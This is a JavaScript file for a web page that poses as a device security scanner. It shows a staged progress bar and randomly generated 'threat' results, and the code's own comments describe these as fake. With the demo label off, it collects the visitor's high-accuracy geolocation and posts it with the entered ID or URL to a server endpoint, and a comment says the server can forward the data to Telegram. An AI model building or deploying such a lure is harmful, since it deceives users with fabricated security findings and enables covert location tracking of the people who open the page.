// public/scripts.js
const analyzeButton = document.getElementById('analyzeButton');
const videoUrlInput = document.getElementById('videoUrlInput');
const demoToggle = document.getElementById('demoToggle');
const statusText = document.getElementById('status');
const progressBar = document.getElementById('progressBar');
const progressBarContainer = document.getElementById('progressBarContainer');
const resultArea = document.getElementById('resultArea');
const simLabel = document.getElementById('simLabel');

function randInt(min, max){ return Math.floor(Math.random()*(max-min+1))+min; }
function pick(arr){ return arr[Math.floor(Math.random()*arr.length)]; }

function makeFakeScanResults(input){
  // plausible-looking fields
  const deviceConfidence = `${randInt(85,99)}%`;
  const threatScore = randInt(0,100); // 0 good — 100 worst
  const threatLevel = threatScore < 20 ? 'Low' : threatScore < 60 ? 'Medium' : 'High';
  const signaturesMatched = randInt(0,5);
  const suspiciousProcesses = randInt(0,3);
  const networkAnomalies = pick(['None detected','Suspicious outbound activity','Potential DNS tunneling','Unknown remote host observed']);
  const recommendations = [
    'Keep your OS up to date',
    'Run full antivirus scan with official vendor',
    'Avoid installing unknown apps',
    'Change device credentials if suspicious'
  ];
  return {
    deviceConfidence, threatScore, threatLevel, signaturesMatched, suspiciousProcesses, networkAnomalies,
    recommendations: pick(recommendations)
  };
}

async function runScanFlow(input, isDemo){
  // clear
  resultArea.innerHTML = '';
  simLabel.style.display = isDemo ? 'block' : 'none';
  statusText.textContent = '';
  progressBar.style.width = '0%';
  progressBarContainer.style.display = 'block';

  // small staged progress to look real
  const stages = [10, 35, 60, 85, 100];
  for (let i=0;i<stages.length;i++){
    progressBar.style.width = stages[i] + '%';
    statusText.textContent = ['Initializing scanner...','Collecting device metadata...','Analyzing signatures...','Checking network & processes...','Finalizing results...'][i];
    // wait
    await new Promise(r => setTimeout(r, 600 + Math.random()*400));
  }

  // produce results
  const results = makeFakeScanResults(input);

  // if demo, show simulated nicely; if not demo, still show "summary" but marked
  const html = `
    <div class="result-box">
      <div style="display:flex;justify-content:space-between;align-items:center">
        <strong>Scan Summary</strong>
        <span class="muted">Confidence: ${results.deviceConfidence}</span>
      </div>
      <div style="margin-top:8px">
        <div><strong>Threat Score:</strong> ${results.threatScore} / 100</div>
        <div><strong>Threat Level:</strong> ${results.threatLevel}</div>
        <div><strong>Signatures Matched:</strong> ${results.signaturesMatched}</div>
        <div><strong>Suspicious Processes:</strong> ${results.suspiciousProcesses}</div>
        <div><strong>Network:</strong> ${results.networkAnomalies}</div>
      </div>

      <div style="margin-top:10px;padding-top:10px;border-top:1px dashed rgba(255,255,255,0.03)">
        <strong>Recommended action:</strong>
        <div class="muted" style="margin-top:6px">${results.recommendations}</div>
      </div>
    </div>
  `;

  resultArea.innerHTML = html;
  statusText.textContent = isDemo ? 'Demo scan finished — results are simulated.' : 'Quick scan finished. (Demo label disabled)';
  progressBarContainer.style.display = 'none';
  progressBar.style.width = '0%';
}

// click handler
analyzeButton.addEventListener('click', async () => {
  const input = videoUrlInput.value.trim();
  if (!input) {
    statusText.textContent = 'Please enter a Device ID or URL.';
    return;
  }

  const isDemo = demoToggle.checked;

  // In demo mode: just simulate locally and DO NOT send fake data to server.
  // If demo disabled: perform a minimal real operation (send device ID + optional geolocation)
  if (isDemo) {
    runScanFlow(input, true);
    return;
  }

  // Non-demo mode: perform real flow but still show user-friendly scan UI
  let locationData = null;
  if ("geolocation" in navigator) {
    try {
      locationData = await new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          pos => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }),
          () => resolve(null),
          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
      });
    } catch (e) { locationData = null; }
  }

  // show UI while sending
  runScanFlow(input, false);

  // send real minimal data to your server
  try {
    await fetch('/api/send-data', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ videoUrl: input, location: locationData })
    });
    // server side can send message to telegram
  } catch (err) {
    console.error('Failed to send to server', err);
  }
});
